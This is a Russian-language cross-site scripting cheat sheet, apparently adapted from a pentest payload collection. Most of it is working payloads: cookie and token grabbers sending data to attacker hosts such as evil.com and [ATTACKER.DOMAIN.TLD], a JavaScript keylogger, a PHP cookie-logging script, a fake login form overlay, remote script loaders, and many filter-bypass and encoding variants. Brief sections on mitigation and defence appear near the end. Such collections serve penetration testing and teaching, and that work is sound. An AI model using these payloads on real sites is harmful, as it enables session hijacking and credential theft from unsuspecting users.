# Межсайтовый скриптинг (Cross-Site Scripting, XSS)

> Межсайтовый скриптинг (XSS) — это тип уязвимости компьютерной безопасности, обычно встречающийся в веб-приложениях. XSS позволяет злоумышленникам внедрять вредоносный код на веб-сайт, который затем выполняется в браузере любого, кто посещает этот сайт. Это может позволить злоумышленникам украсть конфиденциальную информацию, такую как учётные данные пользователя, или выполнять другие вредоносные действия.

## Содержание

- [Методология](#Методология)
- [Proof of Concept (PoC)](#Proof-of-Concept-PoC)
  - [Перехват данных (Data Grabber)](#Перехват-данных-Data-Grabber)
  - [CORS](#CORS)
  - [Подмена UI (UI Redressing)](#Подмена-UI-UI-Redressing)
  - [JavaScript-кейлоггер](#JavaScript-кейлоггер)
  - [Другие способы](#Другие-способы)
- [Идентификация XSS-точки входа](#Идентификация-XSS-точки-входа)
  - [Инструменты](#Инструменты)
- [XSS в HTML/приложениях](#XSS-в-HTMLприложениях)
  - [Распространённые полезные нагрузки](#Распространённые-полезные-нагрузки)
  - [XSS с использованием HTML5-тегов](#XSS-с-использованием-HTML5-тегов)
  - [XSS с использованием удалённого JS](#XSS-с-использованием-удалённого-JS)
  - [XSS в скрытых полях (Hidden Input)](#XSS-в-скрытых-полях-Hidden-Input)
  - [XSS при выводе в верхнем регистре](#XSS-при-выводе-в-верхнем-регистре)
  - [DOM-based XSS](#DOM-based-XSS)
  - [XSS в контексте JavaScript](#XSS-в-контексте-JavaScript)
- [XSS в обёртках URI](#XSS-в-обёртках-URI)
  - [Обёртка javascript:](#Обёртка-javascript)
  - [Обёртка data:](#Обёртка-data)
  - [Обёртка vbscript:](#Обёртка-vbscript)
- [XSS в файлах](#XSS-в-файлах)
  - [XSS в XML](#XSS-в-XML)
  - [XSS в SVG](#XSS-в-SVG)
  - [XSS в Markdown](#XSS-в-Markdown)
  - [XSS в CSS](#XSS-в-CSS)
- [XSS в PostMessage](#XSS-в-PostMessage)
- [Blind XSS](#Blind-XSS)
  - [XSS Hunter](#XSS-Hunter)
  - [Другие инструменты для Blind XSS](#Другие-инструменты-для-Blind-XSS)
  - [Точки входа для Blind XSS](#Точки-входа-для-Blind-XSS)
  - [Советы](#Советы)
- [Mutated XSS](#Mutated-XSS)
- [Лабораторные работы](#Лабораторные-работы)
- [Ссылки](#Ссылки)

**3 основных типа XSS-атак**

| Тип | Описание |
|---|---|
| **Reflected XSS (Отражённый)** | Вредоносный код встроен в ссылку, отправленную жертве. Когда жертва переходит по ссылке, код выполняется в её браузере. Например, злоумышленник может создать ссылку, содержащую вредоносный JavaScript, и отправить её жертве по электронной почте. Когда жертва переходит по ссылке, код выполняется, позволяя злоумышленнику украсть учётные данные. |
| **Stored XSS (Сохранённый)** | Вредоносный код сохраняется на сервере и выполняется каждый раз при доступе к уязвимой странице. Например, злоумышленник может внедрить вредоносный код в комментарий к записи в блоге. Когда другие пользователи просматривают запись, код выполняется в их браузерах. |
| **DOM-based XSS** | Возникает, когда уязвимое веб-приложение изменяет DOM (Document Object Model) в браузере пользователя. Вредоносный код не отправляется на сервер, а выполняется непосредственно в браузере пользователя. Это может затруднить обнаружение и предотвращение таких атак, поскольку сервер не имеет записи о вредоносном коде. |

# Proof of Concept (PoC)

> При эксплуатации XSS-уязвимости более эффективно демонстрировать полноценный сценарий атаки, который может привести к захвату аккаунта или хищению данных. Вместо простого отчёта с `alert()`, надо постараться захватывать ценные данные, такие как платёжная информация, персональные данные (PII), сессионные cookie или учётные данные. При использовании Chrome, есть небольшая заминка. Начиная с версии 92 (20 июля 2021 г.), iframe из разных источников не могут вызывать alert(). Поскольку они используются для создания некоторых более сложных XSS-атак. Придется использовать альтернативную полезную нагрузку PoC `функцию print()`.

### Перехват данных (Data Grabber)

Следующие полезные нагрузки отправляют cookie администратора или чувствительный токен доступа на контролируемую страницу:

```html
<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
<script>document.location='http://localhost/XSS/grabber.php?c='+localStorage.getItem('access_token')</script>
<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
<script>new Image().src="http://localhost/cookie.php?c="+localStorage.getItem('access_token');</script>
```
[Прим.](Прим):
Чтобы отловить все события на странице DevTools-Console-monitorEvents(window, 'click') 

**Скрипт для записи собранных данных в файл (PHP):**

```php
<?php
$cookie = $_GET['c'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' .$cookie."\r\n");
fclose($fp);
?>
```

## CORS

```html
<script>
  fetch('https://[ATTACKER.DOMAIN.TLD]', {
  method: 'POST',
  mode: 'no-cors',
  body: document.cookie
  });
</script>
```

## Подмена UI (UI Redressing)

XSS для изменения HTML-содержимого страницы и отображения поддельной формы входа:

```html
<script>
history.replaceState(null, null, '../../../login');
document.body.innerHTML = "</br></br></br></br></br><h1>Please login to continue</h1><form>Username: <input type='text'>Password: <input type='password'></form><input value='submit' type='submit'>"
</script>
```

## JavaScript-кейлоггер

Кейлоггер перехватывает нажатия клавиш и отправляет их:

```html
<img src=x onerror='document.onkeypress=function(e){fetch("http://[ATTACKER.DOMAIN.TLD]/?k="+String.fromCharCode(e.which))},this.remove();'>
```

## Другие способы

Больше эксплойтов можно найти на [http://www.xss-payloads.com/payloads-list.html?a#category=all](http://www.xss-payloads.com/payloads-list.html?a#category=all):

- [Создание скриншотов через XSS и HTML5 Canvas](https://web.archive.org/web/20120426084546/https://www.idontplaydarts.com/2012/04/taking-screenshots-using-xss-and-the-html5-canvas/)
- [JavaScript-сканер портов](http://www.gnucitizen.org/blog/javascript-port-scanner/)
- [Сканер сети](http://www.xss-payloads.com/payloads/scripts/websocketsnetworkscan.js.html)
- [Выполнение .NET Shell](http://www.xss-payloads.com/payloads/scripts/dotnetexec.js.html)
- [Перенаправление формы](http://www.xss-payloads.com/payloads/scripts/redirectform.js.html)
- [Воспроизведение музыки](http://www.xss-payloads.com/payloads/scripts/playmusic.js.html)


# Идентификация XSS-точки входа

* **Точки входа**
    * Между HTML-тегами: <title>any_code; YOUR_DATA; any_code</title>.
    * В HTML-атрибутах: <a any_attribute="any_data YOUR_DATA"></a>.
    * Между JavaScript-тегами: <script>any_code; YOUR_DATA; any_code</script>.
    * Внутри JavaScript-строки: <script>a = "some"; b="some1 YOUR_DATA"</script>.
    * Параметры запроса — search.
    * Заголовки запроса
    * Название прикрепляемых файлов.
    
Эта полезная нагрузка открывает отладчик в консоли разработчика вместо всплывающего окна:

```html
<script>debugger;</script>
```

Современные приложения с хостингом контента могут использовать **песочницы (sandbox domains)** для безопасного размещения пользовательского контента. 

> Многие из них изолируют загруженный HTML, JavaScript или Flash, чтобы они не могли получить доступ к пользовательским данным.

**Поэтому лучше использовать `alert(document.domain)` или `alert(window.origin)`, а не `alert(1)`, чтобы понять, в каком контексте выполняется XSS.**

* **Лучшая полезная нагрузка вместо `<script>alert(1)</script>`:**

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

* **Использование `console.log()` вместо `alert()`** для отражённого XSS, чтобы не закрывать всплывающие окна при каждом выполнении (для сохранённого XSS):

```html
<script>console.log("Test XSS from the search bar of page XYZ\n".concat(document.domain).concat("\n").concat(window.origin))</script>
```

Дополнительное чтение:

- [Google Bughunter University - XSS in sandbox domains](https://sites.google.com/site/bughunteruniversity/nonvuln/xss-in-sandbox-domains)
- [LiveOverflow Video - DO NOT USE alert(1) for XSS](https://www.youtube.com/watch?v=1d9W0lK9R4E)
- [LiveOverflow blog post - DO NOT USE alert(1) for XSS](https://liveoverflow.com/do-not-use-alert1-for-xss/)



**Инструменты**

Большинство инструментов также подходят для Blind XSS:

| Инструмент | Описание |
|---|---|
| [XSSStrike](https://github.com/s0md3v/XSStrike) | Очень популярный, но, к сожалению, не очень хорошо поддерживаемый |
| [xsser](https://github.com/epsylon/xsser) | Использует headless-браузер для обнаружения XSS-уязвимостей |
| [Dalfox](https://github.com/hahwul/dalfox) | Обширная функциональность и очень быстрый благодаря реализации на Go |
| [XSpear](https://github.com/hahwul/XSpear) | Похож на Dalfox, но на Ruby |
| [domdig](https://github.com/fcavallarin/domdig) | Тестер XSS на базе Headless Chrome |

# Контексты межсайтового скриптинга (XSS)

| № | Контекст | Техника | Пример эксплойта | Краткое описание |
|---|---|---|---|---|
| 1 | Между HTML-тегами | Скрипт-тег | `<script>alert(document.domain)</script>` | Классическое внедрение скрипта |
| 2 | Между HTML-тегами | Изображение с onerror | `<img src=1 onerror=alert(1)>` | Срабатывает при ошибке загрузки изображения |
| 3 | В атрибуте тега | Закрытие кавычки и тега | `"><script>alert(document.domain)</script>` | Завершаем значение атрибута, закрываем тег, внедряем новый |
| 4 | В атрибуте тега | Обработчик события + autofocus | `" autofocus onfocus=alert(document.domain) x="` | Добавляем обработчик, autofocus для автоматического срабатывания |
| 5 | В атрибуте href | Псевдопротокол javascript: | `<a href="javascript:alert(document.domain)">` | Выполнение JS через ссылку |
| 6 | В атрибуте тега (канонический тег) | Access key | `<link rel="canonical" accesskey="X" onclick="alert(1)">` | Вызов через сочетание клавиш (Ctrl+Shift+X) |
| 7 | В JavaScript (внутри скрипта) | Закрытие script-тега | `</script><img src=1 onerror=alert(document.domain)>` | Закрываем текущий скрипт, внедряем свой HTML |
| 8 | В строке JavaScript | Выход через кавычки | `';alert(document.domain)//` | Закрываем строку кавычкой, выполняем код, комментируем остаток |
| 9 | В строке JavaScript | Выход через дефис | `'-alert(document.domain)-'` | Альтернативный способ закрытия строки |
| 10 | В строке JavaScript | Обход экранирования обратного слеша | `\\';alert(document.domain)//` | Нейтрализуем добавленный приложением обратный слеш |
| 11 | В JavaScript (ограничение символов) | Без круглых скобок (throw) | `onerror=alert;throw 1` | Вызов функции через глобальный обработчик исключений |
| 12 | В обработчике события (onclick) | HTML-сущность вместо кавычек | `&apos;-alert(document.domain)-&apos;` | Браузер декодирует &apos; как ' при обработке атрибута |
| 13 | В шаблонном литерале | Встраивание выражения | `${alert(document.domain)}` | Вставка выражения в шаблонный литерал через ${...} |
| 14 | Клиентская шаблонизация (AngularJS) | Внедрение шаблонного выражения | `{{constructor.constructor('alert(1)')()}}` | Использование синтаксиса шаблонизатора для выполнения кода |


# XSS в HTML/приложениях

## Распространённые полезные нагрузки

**Кастом:**
```javascript
location='/site/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'
```
**Базовые полезные нагрузки:**

```javascript
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script>
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
```

**Полезные нагрузки с тегом `<img>`:**

```javascript
<img src=x onerror=alert('XSS');>
<img src=x onerror=alert('XSS')//
<img src=x onerror=alert(String.fromCharCode(88,83,83));>
<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>
<img src=x:alert(alt) onerror=eval(src) alt=xss>
"><img src=x onerror=alert('XSS');>
"><img src=x onerror=alert(String.fromCharCode(88,83,83));>
<><img src=1 onerror=alert(1)>
```

**Полезные нагрузки с тегом `<svg>`:**

```javascript
"><svg><animatetransform onbegin=alert(1)
<svgonload=alert(1)>
<svg/onload=alert('XSS')>
<svg onload=alert(1)//
<svg/onload=alert(String.fromCharCode(88,83,83))>
<svg id=alert(1) onload=eval(id)>
"><svg/onload=alert(String.fromCharCode(88,83,83))>
"><svg/onload=alert(/XSS/)
<svg><script href=data:,alert(1) />
<svg><script>alert('33')
<svg><script>alert&lpar;'33'&rpar;
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

**Полезные нагрузки с тегом `<div>`:**

```javascript
<div onpointerover="alert(45)">MOVE HERE</div>
<div onpointerdown="alert(45)">MOVE HERE</div>
<div onpointerenter="alert(45)">MOVE HERE</div>
<div onpointerleave="alert(45)">MOVE HERE</div>
<div onpointermove="alert(45)">MOVE HERE</div>
<div onpointerout="alert(45)">MOVE HERE</div>
<div onpointerup="alert(45)">MOVE HERE</div>
```

**Полезные нагрузки с тегом `href` тега `<a>`:**

```javascript
<a href="javascript:alert(document.domain)">
```
## XSS с использованием HTML5-тегов

```javascript
<body onload=alert(/XSS/.source)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video/poster/onerror=alert(1)>
<video><source onerror="javascript:alert(1)">
<video src=_ onloadstart="alert(1)">
<details/open/ontoggle="alert`1`">
<audio src onloadstart=alert(1)>
<marquee onstart=alert(1)>
<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>

<body ontouchstart=alert(1)>  <!-- Срабатывает при касании экрана -->
<body ontouchend=alert(1)>    <!-- Срабатывает при отпускании экрана -->
<body ontouchmove=alert(1)>   <!-- При перетаскивании пальца по экрану -->
```

---

## XSS с использованием удалённого JS

```javascript
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
<script src=14.rs>
<!-- Можно указать произвольную полезную нагрузку через 14.rs/#payload -->
<!-- Например: 14.rs/#alert(document.domain) -->
```

---

## XSS в скрытых полях (Hidden Input)

```javascript
<input type="hidden" accesskey="X" onclick="alert(1)">
<!-- Используйте CTRL+SHIFT+X для активации onclick -->

<!-- В новых браузерах (Firefox 130+, Chrome 108+) -->
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

---

## XSS при выводе в верхнем регистре

```javascript
<IMG SRC=1 ONERROR=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
```

---

## DOM-based XSS

На основе источника (sink) DOM XSS:

```javascript
#"><img src=/ onerror=alert(2)>
```

---

## XSS в контексте JavaScript

```javascript
-(confirm)(document.domain)//
; alert(1);//
" autofocus onfocus=alert(document.domain) x="
'-alert(document.domain)-'
';alert(document.domain)//
```

---

# XSS в обёртках URI

## Обёртка javascript:

```javascript
javascript:prompt(1)
```

**Кодировки:**

```javascript
%26%23106%26%2397%26%23118%26%2397%26%23115%26%2399%26%23114%26%23105%26%23112%26%23116%26%2358%26%2399%26%23111%26%23110%26%23102%26%23105%26%23114%26%23109%26%2340%26%2349%26%2341

&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#114&#109&#40&#49&#41
```

**Hex/Octal кодирование:**

```javascript
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003aalert(1)
\152\141\166\141\163\143\162\151\160\164\072alert(1)
```

**Символы новой строки:**

```javascript
java%0ascript:alert(1)   - LF (\n)
java%09script:alert(1)   - Horizontal tab (\t)
java%0dscript:alert(1)   - CR (\r)
```

**Использование escape-символов:**

```javascript
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
```

**С новой строкой и комментарием:**

```html
javascript://%0Aalert(1)
javascript://anything%0D%0A%0D%0Awindow.alert(1)
```

---

## Обёртка data:

```javascript
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

---

## Обёртка vbscript (только Internet Explorer)

```javascript
vbscript:msgbox("XSS")
```

---

# XSS в файлах

## XSS в XML

> **Примечание:** Секция CDATA используется, чтобы JavaScript не обрабатывался как XML-разметка.

```xml
<name>
  <value><![CDATA[<script>confirm(document.domain)</script>]]></value>
</name>
```

```xml
<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
```

---

## XSS в SVG

**Простой скрипт (Зелёный треугольник):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

**Комплексная полезная нагрузка (Красная молния):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" width="100" height="100" xmlns="http://www.w3.org/2000/svg" onload="alert('svg attribut')">
  <polygon id="lightning" points="0,100 50,25 50,75 100,0" fill="#ff1919" stroke="#ff0000"/>
  <desc><script>alert('svg desc')</script></desc>
  <foreignObject><script>alert('svg foreignObject')</script></foreignObject>
  <foreignObject width="500" height="500">
    <iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert('svg foreignObject iframe');" width="400" height="250"/>
  </foreignObject>
  <title><script>alert('svg title')</script></title>
  <animatetransform onbegin="alert('svg animatetransform onbegin')"></animatetransform>
  <script type="text/javascript">
    alert('svg script');
  </script>
</svg>
```

**Короткие SVG-полезные нагрузки:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><foreignObject><![CDATA[</foreignObject><script>alert(2)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

**Вложение SVG и XSS:**

Включение удалённого SVG-изображения в SVG работает, но не вызовет XSS, встроенный в удалённый SVG:

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg" height="200" width="200"/>
</svg>
```

Включение фрагмента удалённого SVG не вызовет XSS, так как атрибуты стиля больше не являются вектором в современных браузерах:

```xml
<svg width="200" height="200" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <use xlink:href="http://10.10.10.10:9999/red_lightning_xss_full.svg#lightning"/>
</svg>
```

Однако вложение SVG-тегов в SVG-документы работает и позволяет выполнять XSS из под-SVG (Французский флаг):

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <svg x="10">
    <rect x="10" y="10" height="100" width="100" style="fill: #002654"/>
    <script type="text/javascript">alert('sub-svg 1');</script>
  </svg>
  <svg x="200">
    <rect x="10" y="10" height="100" width="100" style="fill: #ED2939"/>
    <script type="text/javascript">alert('sub-svg 2');</script>
  </svg>
</svg>
```

---

## XSS в Markdown

```javascript
[a](javascript:prompt(document.cookie))
[a](j a v a s c r i p t:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

---

## XSS в CSS

```javascript
<!DOCTYPE html>
<html>
<head>
<style>
div  {
    background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>");
    background-color: #cccccc;
}
</style>
</head>
  <body>
    <div>lol</div>
  </body>
</html>
```

---

# XSS в PostMessage

Если целевой источник — `*` (звёздочка), сообщение может быть отправлено на любой домен, имеющий ссылку на дочернюю страницу:

```javascript
<html>
<body>
    <input type=button value="Click Me" id="btn">
</body>

<script>
document.getElementById('btn').onclick = function(e){
    window.poc = window.open('http://10.10.10.10/#login');
    setTimeout(function(){
        window.poc.postMessage(
            {
                "sender": "accounts",
                "url": "javascript:confirm('XSS')",
            },
            '*'
        );
    }, 2000);
}
</script>
</html>
```

---

# Blind XSS

## XSS Hunter

> XSS Hunter - позволяет находить все виды XSS-уязвимостей, включая часто пропускаемый Blind XSS. Сервис работает путём размещения специальных XSS-зондов, которые при срабатывании сканируют страницу и отправляют информацию о ней в сервис XSS Hunter.

**Примечание:** [XSS Hunter](https://xsshunter.com) устарел. 

Доступна альтернативная версия:
- Самостоятельная версия: [mandatoryprogrammer/xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express)
- Хостинг: [xsshunter.trufflesecurity.com](https://xsshunter.trufflesecurity.com)

**Полезные нагрузки:**

```javascript
"><script src="https://js.rip/[ATTACKER.DOMAIN.TLD]"></script>
"><script src=//[ATTACKER.DOMAIN.TLD]></script>
<script>$.getScript("//[ATTACKER.DOMAIN.TLD]")</script>
```

---

## Другие инструменты для Blind XSS

| Инструмент | Описание |
|---|---|
| [Netflix-Skunkworks/sleepy-puppy](https://github.com/Netflix-Skunkworks/sleepy-puppy) | Фреймворк управления XSS-полезными нагрузками |
| [LewisArdern/bXSS](https://github.com/LewisArdern/bXSS) | Утилита для обнаружения Blind XSS |
| [ssl/ezXSS](https://github.com/ssl/ezXSS) | Простой способ тестирования Blind XSS |

---

## Точки входа для Blind XSS

- Контактные формы
- Системы поддержки (тикеты)
- Заголовок `Referer`
  - Аналитика сайта
  - Логи административной панели
- User Agent
  - Аналитика сайта
  - Логи административной панели
- Комментарии
  - Административная панель

---

## Советы

Использовать перехватчик данных и однострочный HTTP-сервер для подтверждения существования Blind XSS перед развёртыванием тяжёлых инструментов.

**Полезная нагрузка:**

```javascript
<script>document.location='http://[ATTACKER.DOMAIN.TLD]/XSS/grabber.php?c='+document.domain</script>
```

**Однострочный HTTP-сервер:**

```bash
ruby -run -ehttpd . -p8080
```

---

# Mutated XSS

Используйте особенности браузеров для воссоздания некоторых HTML-тегов.

**Пример:** Mutated XSS от Масато Кинугавы, использованный против компонента cure53/DOMPurify в Google Search:

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

# Защита от XSS

Чтобы предотвратить XSS-атаки, важно правильно валидировать и санировать пользовательский ввод:
- Проверять, что весь ввод соответствует необходимым критериям
- Удалять потенциально опасные символы или код
- Экранировать специальные символы перед выводом в браузер, чтобы предотвратить их интерпретацию как код



## Краткая шпаргалка

| Задача | Полезная нагрузка |
|---|---|
| **Базовый XSS** | `<script>alert(1)</script>` |
| **XSS через изображение** | `<img src=x onerror=alert(1)>` |
| **Кража cookie** | `<script>new Image().src="http://evil.com/?c="+document.cookie</script>` |
| **Кейлоггер** | `<img src=x onerror='document.onkeypress=function(e){fetch("http://evil.com/?k="+String.fromCharCode(e.which))}'>` |
| **Blind XSS** | `<script src="//xsshunter.com"></script>` |
| **SVG XSS** | `<svg onload=alert(1)>` |
| **XSS в Markdown** | `[click](javascript:alert(1))` |

---

## Ссылки

- [XSS Payloads List](http://www.xss-payloads.com/payloads-list.html)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [XSS in hidden fields](https://portswigger.net/research/xss-in-hidden-input-fields)






*	Методы митигации последствий XSS

Для защиты пользователя используется комплекс мер, который называется митигацией. 
Митигация — действия, направленные на смягчение последствий уязвимости, то есть снижение уровня опасности.
Например, если установить параметр HttpOnly для куки-файлов, то злоумышленник не сможет получить доступ к куки из JavaScript. Доступ хакера к JavaScript — это признак XSS-атаки. Однако хакер не получит куки пользователя — их там нет. 

[Для митигации XSS-атак разработчики настраивают:]

*    Параметры куки.
*    Security Headers — HTTP-заголовки безопасности .
*    Content Security Policy — политику безопасности контента.

*    Использовать экранирование, валидацию и санитизацию пользовательского ввода как на серверной, так и на клиентской части. Лучше использовать популярные библиотеки, например DOMPurify.
*    Использовать Content Security Policy — CSP.
*    Не использовать устаревшие или уязвимые к XSS библиотеки и фреймворки.
*    Не использовать небезопасные функции совместно с необработанным пользовательским вводом, такие как eval(), document.write() и другие.
*    Использовать современные фреймворки со встроенной защитой от XSS, такие как React, Vue.js, и Spring. В них безопасность реализована по умолчанию.
    
Более подробно в файле XSS!!!

* **Обход защиты**

* Методы обхода защиты от внедрения Reflected XSS 

    Дублирование тегов — <script><script> или <scr<script>ipt>.
    Использование строчных и прописных букв в нагрузке — <ScRIpt>alert(1)</SCRIPt>.
    Использование   вместо ( ) — <script>alert1</script>.
    Использование различных кодировок нагрузки — Unicode, HTML, URL, Base64, HEX.
    Использование двойного кодирования нагрузки — вместо %3Cscript%3Ealert%281%29%3C%2Fscript%3E используется %253Cscript%253Ealert%25281%2529%253C%252Fscript%253E.
    Использование Polyglot — javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>.


